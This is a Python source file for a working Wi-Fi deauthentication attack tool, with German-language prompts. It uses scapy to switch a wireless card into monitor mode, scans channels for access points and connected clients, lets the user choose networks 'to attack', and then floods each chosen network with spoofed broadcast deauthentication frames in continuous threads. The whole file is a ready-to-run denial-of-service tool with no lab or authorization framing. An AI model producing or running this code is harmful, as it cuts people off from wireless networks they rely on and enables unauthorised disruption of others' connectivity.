import os
import sys
import signal
import subprocess
import threading
import configparser
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeResp, Dot11Deauth, Dot11Elt
import time
import logging
import tkinter as tk
from tkinter import ttk

# Configuration file
CONFIG_FILE = 'deauther_config.ini'

# Logging configuration
logging.basicConfig(filename='wifi_deauth.log', level=logging.INFO, format='%(asctime)s %(message)s')

# Global variables to track the current network interface
interface = None
networks = []
stations = []
scanning = False
scan_window1 = None
scan_window2 = None
root = None
deauth_threads = []
deauth_active = True

# Load configuration
config = configparser.ConfigParser()
if os.path.exists(CONFIG_FILE):
    config.read(CONFIG_FILE)
else:
    config['DEFAULT'] = {
        'interface': '',
        'channels': '1-13',
        'deauth_packet_count': '100',
    }
    with open(CONFIG_FILE, 'w') as configfile:
        config.write(configfile)

def get_interfaces():
    interfaces = subprocess.check_output("iwconfig 2>&1 | grep 'IEEE 802.11' | awk '{print $1}'", shell=True)
    return interfaces.decode().split()

def set_monitor_mode(interface):
    try:
        os.system(f"ip link set {interface} down")
        os.system(f"iw dev {interface} set type monitor")
        os.system(f"ip link set {interface} up")
    except Exception as e:
        print(f"Error setting monitor mode on {interface}: {e}")
        logging.error(f"Error setting monitor mode on {interface}: {e}")

def reset_interface(interface):
    try:
        os.system(f"ip link set {interface} down")
        os.system(f"iw dev {interface} set type managed")
        os.system(f"ip link set {interface} up")
    except Exception as e:
        print(f"Error resetting interface {interface}: {e}")
        logging.error(f"Error resetting interface {interface}: {e}")

def change_channel(interface, channel):
    try:
        os.system(f"iw dev {interface} set channel {channel}")
    except Exception as e:
        print(f"Error changing channel on {interface}: {e}")
        logging.error(f"Error changing channel on {interface}: {e}")

def packet_handler(pkt):
    global networks, stations
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        bssid = pkt[Dot11].addr2
        ssid = pkt.info.decode() if pkt.info else ''
        channel = int(ord(pkt[Dot11Elt:3].info))
        rssi = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else 'N/A'
        enc = 'Open'
        for elt in pkt.iterpayloads():
            if elt.ID == 48:
                enc = 'WPA2'
            elif elt.ID == 221 and elt.info.startswith(b'\x00P\xf2\x01\x01\x00'):
                enc = 'WPA'
            elif elt.ID == 3:
                channel = ord(elt.info)
        if bssid not in [n['bssid'] for n in networks]:
            networks.append({'bssid': bssid, 'ssid': ssid, 'channel': channel, 'rssi': rssi, 'enc': enc, 'clients': 0})
        else:
            for net in networks:
                if net['bssid'] == bssid:
                    net['rssi'] = rssi
                    net['enc'] = enc
                    break
    elif pkt.haslayer(Dot11) and pkt.type == 2 and (pkt.subtype == 0x00 or pkt.subtype == 0x08 or pkt.subtype == 0x0a):
        bssid = pkt[Dot11].addr1
        station = pkt[Dot11].addr2
        ssid = next((net['ssid'] for net in networks if net['bssid'] == bssid), 'N/A')
        if station not in [s['station'] for s in stations]:
            stations.append({'bssid': bssid, 'station': station, 'ssid': ssid})
            for net in networks:
                if net['bssid'] == bssid:
                    net['clients'] += 1
                    break

def update_scan_window():
    global scan_window1, scan_window2, networks, stations
    try:
        scan_window1.delete(*scan_window1.get_children())
        for idx, net in enumerate(networks):
            scan_window1.insert('', 'end', values=(idx + 1, net['channel'], net['bssid'], net['rssi'], net['enc'], net['clients'], net['ssid']))

        scan_window2.delete(*scan_window2.get_children())
        for idx, sta in enumerate(stations):
            ssid = next((net['ssid'] for net in networks if net['bssid'] == sta['bssid']), 'N/A')
            scan_window2.insert('', 'end', values=(idx + 1, sta['station'], sta['bssid'], ssid))
    except RuntimeError:
        pass  # Ignore errors if the window is closed

def scan_networks(interface):
    global scanning, root
    networks.clear()
    stations.clear()
    channels = list(range(1, 14))  # Channels 1 to 13
    scanning = True

    def scan():
        global scanning
        try:
            while scanning:
                for channel in channels:
                    if not scanning:
                        break
                    change_channel(interface, channel)
                    sniff(iface=interface, prn=packet_handler, timeout=2)  # Optimized scan time
                    time.sleep(0.5)
                    if root:
                        root.after(100, update_scan_window)
        except OSError as e:
            if e.errno == 100:
                print(f"Network interface {interface} is down. Resetting and restarting scan...")
                reset_interface(interface)
                set_monitor_mode(interface)
                scan()
        except KeyboardInterrupt:
            scanning = False

    # Create a window for the scan process
    root = tk.Tk()
    root.title("Scanning for Networks and Stations")

    # Create a notebook widget
    notebook = ttk.Notebook(root)
    notebook.pack(expand=True, fill='both')

    # Tab for networks and stations
    tab1 = ttk.Frame(notebook)
    notebook.add(tab1, text='Networks and Stations')

    tree_frame1 = ttk.Frame(tab1)
    tree_frame1.pack(expand=True, fill='both')

    columns1 = ('Nr.', 'Channel', 'BSSID', 'RSSI', 'Encryption', 'Clients', 'SSID')
    global scan_window1
    scan_window1 = ttk.Treeview(tree_frame1, columns=columns1, show='headings')
    for col in columns1:
        scan_window1.heading(col, text=col)
        scan_window1.column(col, width=100)
    scan_window1.pack(expand=True, fill='both')

    columns2 = ('Nr.', 'Station', 'BSSID', 'SSID')
    global scan_window2
    scan_window2 = ttk.Treeview(tree_frame1, columns=columns2, show='headings')
    for col in columns2:
        scan_window2.heading(col, text=col)
        scan_window2.column(col, width=100)
    scan_window2.pack(expand=True, fill='both')

    def on_closing():
        global scanning, root
        scanning = False
        root.destroy()
        root = None

    root.protocol("WM_DELETE_WINDOW", on_closing)
    threading.Thread(target=scan).start()
    root.mainloop()

def display_networks(networks, stations):
    print("\nGefundene Netzwerke:")
    print("Nr.\tKanal\tBSSID\t\t\tRSSI\tVerschlüsselung\tClients\tSSID")
    print("-" * 90)
    for idx, network in enumerate(networks):
        print(f"{idx + 1}\t{network['channel']}\t{network['bssid']}\t{network['rssi']}\t{network['enc']}\t{network['clients']}\t{network['ssid']}")
    print("-" * 90)
    print("\nGefundene Stationen:")
    print("Nr.\tStation\t\t\tBSSID\t\t\tSSID")
    print("-" * 72)
    for idx, station in enumerate(stations):
        ssid = next((net['ssid'] for net in networks if net['bssid'] == station['bssid']), 'N/A')
        print(f"{idx + 1}\t{station['station']}\t{station['bssid']}\t{ssid}")
    print("-" * 72)

def get_targets(networks):
    while True:
        try:
            input_str = input("Wählen Sie die Nummer(n) der Netzwerke zum Angreifen (kommagetrennt): ")
            indices = [int(i.strip()) - 1 for i in input_str.split(',')]
            if all(0 <= i < len(networks) for i in indices):
                return [networks[i] for i in indices]
            else:
                print("Ungültige Eingabe. Bitte geben Sie gültige Nummern aus der Liste ein.")
        except ValueError:
            print("Ungültige Eingabe. Bitte geben Sie eine Liste von Zahlen ein, die durch Kommas getrennt sind.")

def deauth(targets, interface):
    def send_deauth_packet(target, count=100):  # Increased number of packets
        bssid = target['bssid']
        channel = target['channel']
        pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
        change_channel(interface, channel)
        sendp(pkt, iface=interface, count=count, inter=0.1, verbose=False)

    def deauth_thread(target):
        global deauth_active
        try:
            while deauth_active:
                send_deauth_packet(target, int(config['DEFAULT']['deauth_packet_count']))
                print(f"Deauth packet sent to {target['ssid']} (BSSID: {target['bssid']}, Channel: {target['channel']})")
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        except OSError as e:
            if e.errno == 100:
                print(f"Network {target['bssid']} is down")
                logging.info(f"Network {target['bssid']} is down")
            deauth_active = False

    global deauth_threads
    try:
        # Check if multithreading is supported
        if threading.active_count() < os.cpu_count():
            for target in targets:
                t = threading.Thread(target=deauth_thread, args=(target,))
                t.start()
                deauth_threads.append(t)

            for t in deauth_threads:
                t.join()
        else:
            while deauth_active:
                for target in targets:
                    send_deauth_packet(target, int(config['DEFAULT']['deauth_packet_count']))
                    print(f"Deauth packet sent to {target['ssid']} (BSSID: {target['bssid']}, Channel: {target['channel']})")
                    time.sleep(1)
    except KeyboardInterrupt:
        print("\nDeauth-Angriff gestoppt.")
        logging.info("Deauth-Angriff gestoppt.")
    finally:
        deauth_active = False
        for t in deauth_threads:
            t.join()
        deauth_threads = []

def signal_handler(sig, frame):
    global scanning, deauth_active, deauth_threads
    if scanning:
        print("\nScan abgebrochen.")
        scanning = False
    else:
        print("\nExiting and cleaning up...")
        logging.info("Exiting and cleaning up.")
        deauth_active = False
        for t in deauth_threads:
            if t.is_alive():
                t.join()
        deauth_threads = []
        if interface:
            reset_interface(interface)
        sys.exit(0)

def main_menu():
    global interface, scanning
    signal.signal(signal.SIGINT, signal_handler)

    print("Verfügbare Schnittstellen:")
    interfaces = get_interfaces()
    for idx, iface in enumerate(interfaces):
        print(f"{idx + 1}. {iface}")

    iface_choice = int(input("Wählen Sie die Schnittstelle aus, die verwendet werden soll: ")) - 1
    if 0 <= iface_choice < len(interfaces):
        interface = interfaces[iface_choice]
        config['DEFAULT']['interface'] = interface
        with open(CONFIG_FILE, 'w') as configfile:
            config.write(configfile)
        set_monitor_mode(interface)
    else:
        print("Ungültige Schnittstelle. Bitte erneut versuchen.")
        main_menu()

    try:
        scan_networks(interface)
        display_networks(networks, stations)
        if networks:
            targets = get_targets(networks)
            deauth(targets, interface)
        else:
            print("Keine Netzwerke gefunden.")
            main_menu()
    except KeyboardInterrupt:
        if not scanning:
            signal_handler(None, None)

if __name__ == "__main__":
    logging.info("Script gestartet")
    signal.signal(signal.SIGINT, signal_handler)
    main_menu()
